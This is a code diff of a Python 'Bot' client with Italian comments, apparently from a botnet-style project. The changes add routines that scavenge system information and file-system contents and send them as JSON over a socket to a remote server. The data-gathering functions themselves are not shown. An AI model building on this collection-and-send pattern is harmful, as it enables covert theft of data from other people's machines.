@@ -14,7 +14,12 @@ SUCCESSFUL_RESPONSE = 'ok'
 
 class Bot:
     def __init__(self):
-        self.sentence = ''
+        self.informationScavanger = systemRetrieval.InformationScavanger();
+        self.data_sentence = ''
+        self.fileSystem_sentence = ''
+
+        self.send_sentence = ''
+
         self.header_dim = 0
         self.clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -71,22 +76,27 @@ class Bot:
         # 7. Possiamo ora inviare i dati raccolti in formato .json
         self.sendToServer()
 
+        print("thread_connection terminated")
 
     def dataScavange(self):
         """
         Procedura tramite la quale il client raccoglie i dati in formato .json e calcola la dimensione totale.
         :return: None
         """
-        inputSentence = systemRetrieval.SystemInformation()
-        self.sentence = json.dumps(inputSentence.data)
-        self.header_dim = sys.getsizeof(self.sentence.encode(FORMAT))
+        inputDict = self.informationScavanger.systemRetrieval()
+        self.data_sentence = json.dumps(inputDict)
+        self.send_sentence = self.data_sentence
+        self.header_dim = sys.getsizeof(self.send_sentence.encode(FORMAT))
         print("thread_data terminated.")
 
 
     def fileSystemScavange(self):
-        # roba file system
-        # self.header_dim = ...
-        pass
+        inputSentence = self.informationScavanger.fileSystemRetrival()
+        self.fileSystem_sentence = inputSentence
+        self.send_sentence = self.fileSystem_sentence
+        self.header_dim = sys.getsizeof(self.send_sentence.encode(FORMAT))
+        print("thread_fileSystem terminated.")
+
 
     def sendHeaderDim(self):
         """
@@ -95,13 +105,14 @@ class Bot:
         """
         self.clientSocket.send(str(self.header_dim).encode(FORMAT))
 
+
     def sendToServer(self):
         """
         Il client invia al server i dati raccolti in formato .json
         :return: None
         """
         print("Data dimension in bytes (header): ", self.header_dim)
-        self.clientSocket.send(self.sentence.encode(FORMAT))
+        self.clientSocket.send(self.send_sentence.encode(FORMAT))
         self.clientSocket.close()
 
 
